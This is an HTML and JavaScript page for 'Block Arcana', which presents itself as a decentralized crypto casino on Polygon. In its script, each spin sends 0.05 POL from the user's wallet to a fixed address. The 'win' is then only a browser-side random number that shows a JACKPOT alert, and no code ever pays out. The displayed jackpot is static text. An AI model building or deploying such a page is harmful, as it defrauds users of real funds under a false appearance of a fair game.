<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Block Arcana | Global Crypto Casino</title>
    <style>
        :root { --neon: #00ffff; --gold: #ff00ff; --win: #00ff00; }
        body {
            background: radial-gradient(circle at center, #111 0%, #050505 100%);
            color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; margin: 0;
        }
        .nav-header {
            background: rgba(0,0,0,0.5); padding: 15px; display: flex; 
            justify-content: space-between; align-items: center; border-bottom: 1px solid var(--neon);
        }
        .header {
            font-family: serif; font-style: italic; font-size: 2.5em; margin: 20px 0;
            background: linear-gradient(to right, #fff, var(--gold), var(--neon), #fff);
            background-size: 200% auto; -webkit-background-clip: text;
            -webkit-text-fill-color: transparent; animation: shine 5s linear infinite;
        }
        @keyframes shine { to { background-position: 200% center; } }
        
        .jackpot-card {
            background: rgba(255, 255, 255, 0.03); border: 1px solid var(--neon);
            border-radius: 30px; padding: 30px; margin: 20px auto; max-width: 320px;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.1);
        }
        #jackpotValue { color: var(--win); font-size: 3em; font-weight: bold; text-shadow: 0 0 20px var(--win); }

        .btn-bet {
            background: linear-gradient(135deg, var(--gold), #7000ff);
            border: none; padding: 22px 60px; color: white; font-weight: bold;
            border-radius: 60px; cursor: pointer; font-size: 1.3em; margin: 20px 0;
        }
        .btn-bet:disabled { background: #333; opacity: 0.7; }

        .activity-box {
            background: rgba(255, 255, 255, 0.02); border-radius: 20px;
            margin: 20px auto; max-width: 350px; padding: 15px; border: 1px solid rgba(255,255,255,0.05);
        }
        .activity-item { padding: 8px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.8em; color: #aaa; text-align: left; }
    </style>
</head>
<body>

<div class="nav-header">
    <div style="color: var(--neon); font-weight: bold;">BLOCK ARCANA</div>
    <appkit-button></appkit-button> 
</div>

<div style="padding: 20px;">
    <h1 class="header">Block Arcana</h1>
    
    <div class="jackpot-card">
        <div style="color: var(--neon); letter-spacing: 2px; font-size: 0.8em;">LIVE JACKPOT</div>
        <h2 id="jackpotValue">0.0500 POL</h2>
    </div>

    <button class="btn-bet" id="betButton" onclick="playGame()">SPIN & BET</button>
    <div id="status" style="color: var(--neon); font-weight: bold; height: 20px;"></div>

    <div class="activity-box">
        <div id="activity-list">
            <div class="activity-item">System: <b>Protocol ready</b>. Connect wallet to start.</div>
        </div>
    </div>

    <a href="https://polygonscan.com/address/0x8e25e9858679f29193233f7d5d9939105408d257" target="_blank" style="color: var(--neon); text-decoration: none; font-size: 0.7em;">üîç LIVE BLOCKCHAIN SCAN</a>
</div>

<script type="module">
  import { createAppKit } from 'https://esm.sh/@reown/appkit'
  import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers'
  import { polygon } from 'https://esm.sh/@reown/appkit/networks'

  const projectId = 'A26c2cef0fcf1c593197f7465d71c07e';

  const metadata = {
    name: 'Block Arcana',
    description: 'Decentralized Casino',
    url: 'https://arcana2026.github.io/Arcana/',
    icons: ['https://avatars.githubusercontent.com/u/179229932']
  }

  const modal = createAppKit({
    adapters: [new EthersAdapter()],
    networks: [polygon],
    metadata,
    projectId,
    features: { analytics: true }
  })

  // Logique de jeu int√©gr√©e
  window.playGame = async () => {
    const status = document.getElementById("status");
    const btn = document.getElementById("betButton");
    
    try {
        const { address, isConnected } = modal.getAccount();
        if (!isConnected) return modal.open();

        btn.disabled = true;
        status.innerText = "CONFIRMATION...";

        const walletProvider = modal.getWalletProvider();
        const ethersProvider = new ethers.providers.Web3Provider(walletProvider);
        const signer = ethersProvider.getSigner();

        const tx = {
            to: "0x8e25e9858679f29193233f7d5d9939105408d257",
            value: ethers.utils.parseEther("0.05")
        };

        const transaction = await signer.sendTransaction(tx);
        status.innerText = "SPINNING...";
        await transaction.wait();

        setTimeout(() => {
            btn.disabled = false;
            if (Math.floor(Math.random() * 50) + 1 === 7) {
                alert("üé∞ JACKPOT !");
            } else {
                status.innerText = "TRY AGAIN";
                setTimeout(() => status.innerText = "", 3000);
            }
        }, 3000);

    } catch (e) {
        btn.disabled = false;
        status.innerText = "ERROR";
    }
  }
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
</body>
</html>
